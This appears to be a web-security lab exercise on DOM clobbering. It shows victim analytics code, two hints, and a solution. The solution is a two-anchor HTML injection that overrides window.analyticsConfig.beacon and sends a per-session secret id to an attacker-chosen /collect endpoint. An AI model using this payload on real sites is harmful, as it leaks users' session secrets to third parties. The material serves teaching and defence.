Analytics beacon

On load the app derives an analytics endpoint from window.analyticsConfig and appends a per-session secret id. It should only ever talk to /api/analytics/ping. Make it send the session id to your collector (/collect) instead.

Victim code

const cfg = window.analyticsConfig
          || { beacon: '/api/analytics/ping' };

const url = cfg.beacon + '?sid=' + SID;

new Image().src = url;

A single global can resolve to a single element, but multiple elements with the same id produce an HTMLCollection. A collection supports named access for children that have a name attribute.

Your HTML injection

Hint 1 — shape

You need cfg.beacon to become an attacker-controlled value. With two elements sharing id="analyticsConfig", window.analyticsConfig is a collection — and the second element can expose itself as the beacon property via name="beacon".

Hint 2 — from element to string

cfg.beacon will be an element, but string concatenation coerces it. Which element's String() returns its href?

Solution 
<a id="analyticsConfig"></a>
<a id="analyticsConfig" name="beacon" href="/collect"></a>

window.analyticsConfig is an HTMLCollection; .beacon returns the second anchor; string concatenation calls HTMLAnchorElement.prototype.toString, which returns the absolute href. The beacon becomes http://127.0.0.1:8000/collect?sid=….
